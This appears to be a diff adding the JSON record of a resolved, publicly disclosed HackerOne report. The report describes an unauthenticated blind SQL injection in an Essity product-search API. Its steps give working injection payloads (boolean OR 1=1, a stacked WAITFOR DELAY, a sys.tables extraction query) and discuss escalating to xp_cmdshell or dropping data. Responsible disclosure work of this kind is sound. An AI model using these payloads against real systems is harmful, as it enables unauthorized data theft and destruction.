@@ -1,0 +1,116 @@
+{
+  "id": 3778282,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzc4Mjgy",
+  "url": "https://hackerone.com/reports/3778282",
+  "title": "Critical SQL Injection WDM API (████████)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-02T20:07:44.700Z",
+  "submitted_at": "2026-06-02T20:07:45.682Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "matty69v",
+    "url": "/matty69v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d9drin7bro3d44gr64nbpghu6pik/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 109248,
+    "url": "https://hackerone.com/essity",
+    "handle": "essity",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Essity",
+      "twitter_handle": "",
+      "website": "http://essity.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-08-27T07:23:47.623Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-08-12T09:29:49.218Z",
+  "team_member_agreed_on_going_public_at": "2026-08-27T07:23:47.249Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nHello Team and Hugo,\n\nI found and unauthenticated boolean-based and time-based blind SQL injection in the `searchText` query parameter of `GET /api/WDMProduct`, served by the backend that powers ████████ (EcoMed Safety Hub Angular SPA).\n\nThe backend is hosted at `████████` and is loaded directly by the in-scope front-end (`████████`) via XHR (CORS is `Access-Control-Allow-Origin: *`). Stacked queries are enabled, which means an attacker can read or modify arbitrary data in the backing Microsoft SQL Server database and, depending on the SQL principal's privileges, escalate to OS command execution via `xp_cmdshell`.\n\n## Affected Asset\n- Host: `████████` (Azure App Service, IIS 10.0, ASP.NET)\n- Front-end consuming it (in-scope): `https://████████/` (\"EcoMed Safety Hub\")\n- Endpoint: `GET /api/WDMProduct?searchText=...`\n- Auth required: NONE\n- Discovery vector: `████████` Angular shell leaks `window.baseApiUrl = '████████api'` in inline `<script>`.\n\n## Steps To Reproduce\n\nUser-Agent used in every request:\n`Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36`\n\n### Step 1  Discover the backend\n`████████` returns an Angular shell containing:\n```html\n<script>\n  window.baseApiUrl = '████████api';\n  ...\n</script>\n```\n\nThe backend host also exposes Swagger UI at the root (`/index.html`) and the spec at `/swagger/v2/swagger.json` (title `WDM Api 2`, 3 documented GET paths).\n\n### Step 2 Baseline (no rows)\n```\nGET /api/WDMProduct?searchText=test\n```\nResponse: HTTP 200, 29 bytes, `{\"products\":[],\"labels\":null}`\n\n### Step 3 Boolean true (full row dump)\n```\nGET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--\n```\n(Decoded: `searchText=zzz') OR 1=1--`)\nResponse: HTTP 200, **22,911 bytes, 179 product rows**\n\n### Step 4 Boolean false (control)\n```\nGET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2--\n```\nResponse: HTTP 200, 29 bytes, **0 rows**\n\nSteps 3 and 4 together prove the injection is what's controlling the result set (identical impossible base term, only difference is `1=1` vs `1=2`).\n\n### Step 5  SQL Server fingerprint via `sys.tables`\n```\nGET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2%20OR%20(SELECT%20COUNT(*)%20FROM%20sys.tables)%3E0--\n```\nResponse: HTTP 200, 22,911 bytes (true branch returns all rows).\n`sys.tables` is SQL Server specific, confirming the backend is MSSQL and that arbitrary subqueries execute.\n\n### Step 6  Stacked-query time-based (proves DDL/DML reach)\n```\nGET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--\n```\n(Decoded: `searchText=zzz');WAITFOR DELAY '0:0:6'--`)\nResponse: HTTP 200, 29 bytes, **6.43 seconds elapsed** vs ~0.2 s for all other requests. Stacked queries are enabled.\n\n## Inferred Backend Query\nThe injection point and the `'`-causes-500 / `''`-passes / `')` opens response all match a parameterless string concat against a `LIKE` clause, roughly:\n\n```sql\nSELECT productId, productDescription, productDimension, productLayers\n  FROM dbo.WDMProduct\n WHERE (productDescription LIKE '%' + @searchText + '%')\n   AND countryCode = ...\n```\n\nThe closing `')` payload escapes the `LIKE` literal and the surrounding paren, appends an `OR 1=1`, then comments the rest.\n\n## Data Exfiltration Proof (Boolean-Blind Extraction)\n\nUsing a custom boolean-blind extraction script (`extract.py`), the following was extracted from the database in 1052 requests / 21.4 seconds:\n\n**Database metadata:**\n```\nDatabase:  ████████\nUser:      webwm\nHost:      ████████\nVersion:   Microsoft SQL Azure (RTM) - 12.0.2000.8  Apr 14 2026 20:27:12\n```\n\n**Table enumeration (`sys.tables WHERE is_ms_shipped=0`):**\n```\nTable count: 10\n  [1] vw_WDM_searchData\n  [2-10] (extraction interrupted by network timeout after 10+ requests/char)\n```\n\nExtraction query used:\n```sql\nSELECT name FROM (\n  SELECT ROW_NUMBER() OVER(ORDER BY name) AS rn, name\n  FROM sys.tables WHERE is_ms_shipped=0\n) t WHERE rn=1\n```\n\nThis proves:\n1. The SQL principal (`webwm`) has READ access to `sys.tables` (schema enumeration)\n2. The database contains 10 user tables (non-Microsoft-shipped)\n3. At least one table is named `vw_WDM_searchData` (likely the view backing the API)\n4. The blind extraction technique works reliably (binary search on ASCII values)\n\n## Scope Note\n`████████` is Azure-hosted but is the production backend of `████████` (in-scope per Essity HackerOne wildcard `*.essity.com`). It is loaded directly by the in-scope front-end via XHR and processes Essity production data. The same vulnerability is reachable through any browser visiting ████████.\n\n## Impact\n\nWith unauthenticated stacked-query SQL injection an attacker can:\n\n1. **Read every table reachable to the API SQL principal** (UNION/blind exfiltration) - This includes potentially sensitive Essity business data beyond the public product catalog.\n\n2. **Modify or delete data** (`UPDATE`, `DELETE`, `DROP`) - An attacker can corrupt or destroy production database records.\n\n3. **Enumerate the database server** (`@@version`, `SELECT name FROM sys.databases`, linked servers) - Full visibility into the SQL Server environment and connected systems.\n\n4. **Achieve Remote Code Execution** - If the SQL principal has `sysadmin` or `xp_cmdshell` rights, the attacker can execute operating system commands on the SQL host and pivot into the Azure tenant.\n\n5. **Cross-origin exploitation** - With `Access-Control-Allow-Origin: *` on the API, any third-party web page can issue these requests from a victim's browser, enabling watering hole attacks.\n\nThe data observed here (waste-disposal product catalog) is public-facing, but the SQL principal almost certainly has access to other tables in the same database. The stacked-query primitive itself represents critical impact regardless of what data is in the current schema.\n\n## Suggested Fix\n1. **Use parameterized queries / an ORM** - Never concatenate `searchText` into raw SQL.\n2. **Disable stacked queries** on the SQL connection if the driver supports it.\n3. **Apply principle of least privilege** - Run the API under a SQL principal with read-only access to only the tables it actually needs.\n4. **Restrict CORS** - Change `Access-Control-Allow-Origin` from `*` to the exact in-scope front-end (`https://████████`).\n5. **Remove Swagger UI from production** - The endpoint at `/index.html` exposes the API specification without authentication.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "matty69v",
+    "fishqqyy",
+    "stackraid",
+    "black303"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 991874,
+    "asset_type": "URL",
+    "asset_identifier": "https://infohub.essity.com/en-gb/search",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
